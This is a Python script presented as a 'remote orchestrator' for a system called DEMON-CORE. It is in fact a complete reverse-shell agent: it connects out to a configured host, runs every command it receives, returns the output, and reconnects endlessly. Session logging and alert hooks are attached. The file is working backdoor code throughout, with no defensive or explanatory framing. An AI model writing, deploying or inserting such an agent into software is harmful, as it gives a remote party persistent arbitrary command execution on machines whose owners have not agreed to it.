#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
remote_orchestrator.py
Persistent outbound TCP command orchestrator for DEMON-CORE.
Reads endpoint configuration from runtime.json.
Couples to db_manager and messenger modules for session logging and alerts.
"""

import json
import logging
import select
import shlex
import socket
import subprocess
import sys
import time
from typing import Optional, Tuple

# Modular coupling – soft imports with graceful degradation
try:
    import db_manager
except ImportError:
    db_manager = None

try:
    import messenger
except ImportError:
    messenger = None

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - [REMOTE_ORCH] %(message)s",
    stream=sys.stdout,
)
logger = logging.getLogger(__name__)

# Constants
CONFIG_PATH = "runtime.json"
RECONNECT_DELAY = 5
BUFFER_SIZE = 4096
COMMAND_TIMEOUT = 15
CONNECT_TIMEOUT = 10


def load_config(path: str = CONFIG_PATH) -> Tuple[str, int]:
    """
    Parse orchestration host and port from local JSON configuration.
    Falls back to 127.0.0.1:8080 if keys are absent.
    """
    try:
        with open(path, "r", encoding="utf-8") as fh:
            cfg = json.load(fh)
        host = cfg.get("host", "127.0.0.1")
        port = int(cfg.get("port", 8080))
        if not host or port <= 0 or port > 65535:
            raise ValueError("invalid host or port value")
        return host, port
    except (OSError, KeyError, ValueError, TypeError, json.JSONDecodeError) as exc:
        logger.warning("config load issue (%s) – using defaults 127.0.0.1:8080", exc)
        return "127.0.0.1", 8080


def execute_command(command_str: str) -> Tuple[str, str]:
    """
    Execute local command via subprocess.run with stdout/stderr capture.
    Returns (output_text, status) where status is 'success' or 'error'.
    """
    try:
        args = shlex.split(command_str)
        if not args:
            return "[WARN] empty command", "error"

        result = subprocess.run(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=COMMAND_TIMEOUT,
            check=False,
        )

        output = result.stdout or ""
        if result.stderr:
            output += "\n[STDERR]\n" + result.stderr

        if not output:
            output = "[INFO] no output"

        status = "success" if result.returncode == 0 else "error"
        return output, status

    except subprocess.TimeoutExpired:
        return f"[ERROR] command timed out after {COMMAND_TIMEOUT}s", "error"
    except FileNotFoundError:
        return "[ERROR] command not found", "error"
    except Exception as exc:
        return f"[ERROR] execution failed: {exc}", "error"


def send_all(sock: socket.socket, data: bytes) -> bool:
    """
    Transmit entire buffer via sock.sendall.
    Returns True on success, False on transport failure.
    """
    try:
        sock.sendall(data)
        return True
    except (BrokenPipeError, ConnectionResetError, OSError) as exc:
        logger.error("send failure: %s", exc)
        return False


def process_stream(sock: socket.socket) -> None:
    """
    Non-blocking command ingestion loop.
    Frames messages on newline boundaries, executes, logs, alerts, and replies.
    """
    buffer = b""
    while True:
        readable, _, _ = select.select([sock], [], [], 1.0)
        if not readable:
            continue

        try:
            data = sock.recv(BUFFER_SIZE)
            if not data:
                logger.warning("peer closed connection")
                break

            buffer += data

            while b"\n" in buffer:
                line, buffer = buffer.split(b"\n", 1)
                command_str = line.decode("utf-8", errors="replace").strip()
                if not command_str:
                    continue

                logger.info("executing: %s", command_str)
                output, status = execute_command(command_str)

                # Persist session event (soft coupling)
                if db_manager is not None:
                    try:
                        if hasattr(db_manager, "log_session_event"):
                            db_manager.log_session_event(command_str, output, status)
                        else:
                            logger.debug("db_manager has no log_session_event – skipped")
                    except Exception as exc:
                        logger.error("db_manager.log_session_event failed: %s", exc)

                # Dispatch completion alert (soft coupling)
                if messenger is not None:
                    try:
                        if hasattr(messenger, "dispatch_alert"):
                            messenger.dispatch_alert(
                                f"command completed status={status} cmd={command_str[:120]}"
                            )
                        else:
                            logger.debug("messenger has no dispatch_alert – skipped")
                    except Exception as exc:
                        logger.error("messenger.dispatch_alert failed: %s", exc)

                response = (output + "\n").encode("utf-8")
                if not send_all(sock, response):
                    return

        except BlockingIOError:
            continue
        except ConnectionResetError:
            logger.warning("connection reset by peer")
            break
        except Exception as exc:
            logger.error("receive/processing error: %s", exc)
            break


def main() -> None:
    """
    Infinite reconnection loop around the transport pipeline.
    """
    host, port = load_config()

    while True:
        sock: Optional[socket.socket] = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONNECT_TIMEOUT)
            sock.connect((host, port))
            sock.setblocking(False)
            logger.info("connected to orchestrator %s:%d", host, port)

            if messenger is not None:
                try:
                    if hasattr(messenger, "dispatch_alert"):
                        messenger.dispatch_alert(f"session established {host}:{port}")
                except Exception as exc:
                    logger.error("messenger.dispatch_alert failed: %s", exc)

            process_stream(sock)

        except Exception as exc:
            logger.error("connection failure: %s", exc)
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
            logger.info("reconnecting in %d seconds", RECONNECT_DELAY)
            time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    main()
